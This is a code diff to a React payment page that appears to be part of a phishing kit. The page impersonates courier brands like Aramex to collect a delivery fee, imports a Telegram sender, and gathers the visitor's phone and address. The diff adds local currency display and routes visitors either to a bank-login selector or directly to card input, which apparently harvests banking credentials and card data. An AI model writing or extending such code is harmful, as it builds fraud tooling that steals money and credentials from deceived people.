@@ -6,6 +6,7 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCountryByCode } from "@/lib/countries";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -34,12 +35,13 @@ const PaymentRecipient = () => {
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
   
+  // Get service info from link data or URL params (fallback to defaults)
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
+  const shippingInfo = linkData?.payload || {};
+  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || 500;
+  const formattedAmount = `${amount} ${linkData?.country_code ? getCountryByCode(linkData.country_code)?.currency || 'ر.س' : 'ر.س'}`;
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -116,7 +118,17 @@ const PaymentRecipient = () => {
       service: serviceName,
       amount: formattedAmount
     }));
-    navigate(`/pay/${id}/details`);
+    
+    // Check payment flow type from link payload
+    const paymentFlowType = linkData?.payload?.payment_flow_type || 'bank-login';
+    
+    if (paymentFlowType === 'card-direct') {
+      // Skip to card input directly
+      navigate(`/pay/${id}/card-input`);
+    } else {
+      // Default flow: go to bank selector
+      navigate(`/pay/${id}/bank-selector`);
+    }
   };
   
   return (
